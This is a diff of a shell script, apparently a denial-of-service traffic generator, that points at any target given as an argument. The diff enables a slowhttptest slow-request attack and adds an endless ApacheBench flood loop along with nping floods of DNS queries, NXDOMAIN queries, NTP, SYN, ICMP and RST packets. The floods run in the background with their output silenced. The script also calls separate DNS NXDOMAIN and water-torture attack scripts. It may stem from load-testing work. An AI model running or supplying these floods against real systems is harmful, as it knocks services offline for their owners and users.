@@ -1,10 +1,10 @@
 #!/bin/sh
 # Christopher Gray
-# Version 0.1.10
-#  5-21-18
+# Version 0.1.11
+#  6-22-18
 
 if [ -z "$1" ]
-   then
+then
       echo "No dest defined to attack! please define one before continuing \r\n"
       exit
 else
@@ -14,22 +14,21 @@ fi
 
 
 if [ -z "$2" ]
-   then
+then
       echo "Defaulting queries to send is set to: 1500 \r\n"
       queries_ps=1500
-   else
+else
       queries_ps=$2
       #echo "port = $server_port \r\n"
 fi
 
 
-if [ -e "queryfile-example-current"]
-   then
+if [ -f queryfile-example-current ]
+then
       echo "Loading Nominum sample data file! \r\n \r\n"
-   else
+else
       echo "Missing Nominum sample data... downloading it!  \r\n \r\n "
       wget -O "queryfile-example-current.gz" "ftp://ftp.nominum.com/pub/nominum/dnsperf/data/queryfile-example-current.gz"
-      
       echo "Decompressing file... \r\n \r\n"
       gunzip queryfile-example-current.gz
       wait
@@ -61,11 +60,38 @@ sudo dnsperf -s $server_ip -d queryfile-example-current -c 200 -T 10 -l 300 -q 1
 wait
 
 # Webflow
-#./slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u https://myseceureserver/resources/loginform.html -x 10 -p 3
-
+./slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u https://myseceureserver/resources/loginform.html -x 10 -p 3
 
 #------ Attack traffic ----------
 python attack_dns_nxdomain.py $server_ip google.com 10000
 ./attack_dns_watertorture_wget.sh google.com
 
+#---- apache bench attack ----
+while true
+do
+    ab -r -c 1000 -n 1000000 $server_ip  &>/dev/null
+done
+
+#-----------------------------------------------------------------------------------------------------------------
+RATE=5000
+SAMPLES=1000000000
+OUTPUT=&>/dev/null
+NPING_SILENT='-HNq'
+VALID_DNS_QUERY="000001000001000000000000037177650474657374036c61620000010001"
+INEXISTENT_DNS_QUERY="0000000000010000000000000c6e6f73756368646f6d61696e08696e7465726e616c036c61620000010001"
+
+# A query flood
+nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $VALID_DNS_QUERY  $OUTPUT &
+#NX domain flood
+nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 53 --data $INEXISTENT_DNS_QUERY $OUTPUT &
+#NTP flood
+nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --udp -p 123 --data-length 100 $OUTPUT &
+#SYN Flood
+nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags SYN -p 22 $OUTPUT &
+#ICMP Flood
+nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --icmp $OUTPUT &
+#RST Flood
+nping $server_ip $NPING_SILENT -c $SAMPLES --rate $RATE --tcp --flags RST -p 22 $OUTPUT &
+
+#-----------------------------------------------------------------------------------------------------------------
 echo "DONE \r\n \r\n"
